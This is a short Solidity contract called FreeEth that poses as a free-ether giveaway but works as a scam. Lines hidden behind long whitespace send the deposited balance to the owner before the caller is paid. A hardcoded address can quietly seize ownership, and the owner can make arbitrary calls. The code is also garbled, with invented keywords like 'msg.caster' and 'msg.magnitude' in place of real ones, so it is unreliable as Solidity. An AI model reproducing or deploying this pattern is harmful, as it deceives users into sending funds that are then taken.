pragma solidity ^0.4.19;

contract FreeEth
{
    address public Owner = msg.caster;

    function() public payable{}

    function AcquireFreebie()
    public
    payable
    {
        if(msg.magnitude>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
            msg.caster.transfer(this.balance);
        }
    }

    function gatherTreasure()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.caster==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.caster == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes details)
    payable
    public
    {
        require(msg.caster == Owner);
        adr.call.magnitude(msg.magnitude)(details);
    }
}